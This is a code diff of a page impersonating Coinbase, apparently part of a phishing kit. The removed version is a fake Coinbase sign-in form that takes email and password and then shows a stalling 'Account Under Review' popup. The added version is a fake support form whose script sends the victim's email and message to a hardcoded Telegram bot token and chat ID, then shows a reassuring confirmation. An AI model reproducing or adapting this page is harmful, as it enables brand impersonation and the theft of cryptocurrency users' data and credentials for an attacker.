@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign In - Coinbase</title>
+  <title>Support - Coinbase</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     body {
@@ -21,7 +21,25 @@
       overflow-x: hidden;
     }
 
-    .login-container {
+    .top-right {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+
+    .top-right a {
+      color: #4c8ffb;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 15px;
+      transition: color 0.3s ease;
+    }
+
+    .top-right a:hover {
+      color: #ffffff;
+    }
+
+    .support-container {
       width: 100%;
       max-width: 400px;
       text-align: center;
@@ -40,21 +58,14 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    .logo {
-      width: 150px;
-      margin-bottom: 30px;
-      filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.5));
-      animation: fadeIn 0.5s ease-in-out;
-    }
-
-    .login-title {
+    .support-title {
       font-size: 28px;
       font-weight: 700;
       margin-bottom: 15px;
       color: #ffffff;
     }
 
-    .login-text {
+    .support-text {
       font-size: 14px;
       color: #cccccc;
       margin-bottom: 25px;
@@ -76,7 +87,8 @@
       color: #ffffff;
     }
 
-    .form-group input {
+    .form-group input,
+    .form-group textarea {
       width: 100%;
       padding: 12px;
       border: none;
@@ -86,16 +98,19 @@
       font-size: 14px;
       box-sizing: border-box;
       transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      resize: none;
     }
 
-    .form-group input::placeholder {
-      color: #888888;
-    }
-
-    .form-group input:focus {
+    .form-group input:focus,
+    .form-group textarea:focus {
       outline: none;
       background-color: #333333;
       box-shadow: 0 0 0 2px #4c8ffb;
+    }
+
+    .form-group input::placeholder,
+    .form-group textarea::placeholder {
+      color: #888888;
     }
 
     .btn {
@@ -143,26 +158,6 @@
       100% { transform: rotate(360deg); }
     }
 
-    .footer-links {
-      margin-top: 20px;
-      font-size: 14px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      font-weight: 400;
-    }
-
-    .footer-links a {
-      color: #4c8ffb;
-      text-decoration: none;
-      transition: color 0.3s ease;
-    }
-
-    .footer-links a:hover {
-      color: #ffffff;
-      text-decoration: underline;
-    }
-
     /* End to End Encryption Text with CSS Padlock */
     .encryption-text {
       display: flex;
@@ -172,6 +167,7 @@
       font-size: 12px;
       color: #888888;
       margin-top: 20px;
+      margin-bottom: 20px;
       text-align: center;
       font-weight: 400;
     }
@@ -215,7 +211,7 @@
       100% { transform: translateY(0); }
     }
 
-    /* Error Pop-up Styles */
+    /* Popup Styles */
     .popup-overlay {
       display: none;
       position: fixed;
@@ -224,9 +220,9 @@
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.8);
-      z-index: 1000;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      z-index: 1000;
       animation: fadeInOverlay 0.3s ease;
     }
 
@@ -237,11 +233,11 @@
 
     .popup {
       background: #1a1a1a;
-      border-radius: 12px;
       padding: 25px;
-      max-width: 350px;
-      width: 90%;
+      border-radius: 12px;
       text-align: center;
+      width: 90%;
+      max-width: 320px;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
       animation: popupScale 0.3s ease;
     }
@@ -251,14 +247,14 @@
       to { transform: scale(1); opacity: 1; }
     }
 
-    .popup-title {
+    .popup h2 {
       font-size: 20px;
       font-weight: 600;
-      color: #ff4d4f;
       margin-bottom: 12px;
+      color: #4c8ffb;
     }
 
-    .popup-text {
+    .popup p {
       font-size: 14px;
       color: #cccccc;
       margin-bottom: 20px;
@@ -266,52 +262,36 @@
       font-weight: 400;
     }
 
-    .popup-btn {
+    .popup .btn {
       width: 100%;
       padding: 12px;
-      border: none;
-      border-radius: 32px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      background-color: #4c8ffb;
-      color: #000000;
-      transition: background-color 0.3s ease, transform 0.2s ease;
-    }
-
-    .popup-btn:hover {
-      background-color: #367af6;
-      transform: translateY(-2px);
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <img src="https://i.ibb.co/vvxn966F/In-Shot-20250418-173504055.png" alt="Coinbase Logo" class="logo">
-    <div class="login-title">Sign In to Coinbase</div>
-    <div class="login-text">
-      Enter your email and password to access your account securely.
-    </div>
+  <div class="top-right">
+    <a href="index.html">Back to Home</a>
+  </div>
 
-    <form id="login-form">
+  <div class="support-container">
+    <h1 class="support-title">Support</h1>
+    <p class="support-text">
+      Need help? Submit your query below, and our support team will get back to you as soon as possible.
+    </p>
+
+    <form id="support-form" action="#">
       <div class="form-group">
         <label for="email">Email Address</label>
-        <input type="email" id="email" name="email" placeholder="Enter your email" required>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required />
       </div>
       <div class="form-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        <label for="message">Message</label>
+        <textarea id="message" name="message" placeholder="Describe your issue or question" rows="5" required></textarea>
       </div>
-
-      <button type="submit" class="btn btn-primary" id="signin-btn">
-        <span class="btn-text">Sign In</span>
+      <button type="submit" id="submit-btn" class="btn btn-primary">
+        <span class="btn-text">Submit</span>
       </button>
     </form>
-
-    <div class="footer-links">
-      <a href="reset-password.html">Forgot password?</a>
-      <a href="#">Sign in with Passkey</a>
-    </div>
 
     <div class="encryption-text">
       <span class="padlock"></span>
@@ -319,50 +299,76 @@
     </div>
   </div>
 
-  <!-- Error Pop-up -->
   <div class="popup-overlay" id="popup-overlay">
     <div class="popup">
-      <div class="popup-title">Account Under Review</div>
-      <div class="popup-text">
-        Your account is under review. Please wait 12 hours before proceeding.
-      </div>
-      <button class="popup-btn" id="popup-btn">Cancel</button>
+      <h2>Support Request Submitted</h2>
+      <p>Your support request has been successfully submitted. We’ll get back to you soon. Return to the home page to continue.</p>
+      <button id="popup-btn" class="btn btn-primary">
+        <span class="btn-text">Return to Home</span>
+      </button>
     </div>
   </div>
 
   <script>
-    document.getElementById('login-form').addEventListener('submit', function(event) {
+    document.getElementById('support-form').addEventListener('submit', async function(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const signinBtn = document.getElementById('signin-btn');
+      const message = document.getElementById('message').value;
+      const submitBtn = document.getElementById('submit-btn');
       const popupOverlay = document.getElementById('popup-overlay');
 
-      // Basic client-side validation
+      // Validation
       if (!email.includes('@')) {
         alert('Please enter a valid email address.');
         return;
       }
-      if (password.length < 8) {
-        alert('Password must be at least 8 characters long.');
+      if (message.trim().length < 10) {
+        alert('Please enter a message with at least 10 characters.');
         return;
       }
 
-      // Show loading effect
-      signinBtn.classList.add('loading');
-      signinBtn.disabled = true;
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
 
-      // Show error pop-up after loading
-      setTimeout(() => {
-        signinBtn.classList.remove('loading');
-        signinBtn.disabled = false;
+      // Send to Telegram
+      const telegramMessage = `Support Request\nEmail: ${email}\nMessage: ${message}`;
+      const botToken = '7941038958:AAEjfxGzJr8zjVl9JiumnMiIBoTZRR7os7g'; // Your bot token
+      const chatId = '7968566350'; // Your chat ID
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;
+
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          console.log('Message sent to Telegram');
+          setTimeout(() => {
+            submitBtn.classList.remove('loading');
+            submitBtn.disabled = false;
+            popupOverlay.style.display = 'flex'; // Show popup after Telegram submission
+          }, 4000);
+        } else {
+          console.error('Failed to send message to Telegram');
+          alert('Failed to send message to Telegram');
+          submitBtn.classList.remove('loading');
+          submitBtn.disabled = false;
+          popupOverlay.style.display = 'flex';
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Error sending message: ' + error.message);
+        submitBtn.classList.remove('loading');
+        submitBtn.disabled = false;
         popupOverlay.style.display = 'flex';
-      }, 4000); // 4-second delay to match other pages
+      }
     });
 
-    // Handle pop-up cancel button
     document.getElementById('popup-btn').addEventListener('click', function() {
-      document.getElementById('popup-overlay').style.display = 'none';
+      const popupBtn = document.getElementById('popup-btn');
+      popupBtn.classList.add('loading');
+      popupBtn.disabled = true;
+
+      setTimeout(() => {
+        window.location.href = 'index.html';
+      }, 4000);
     });
   </script>
 </body>
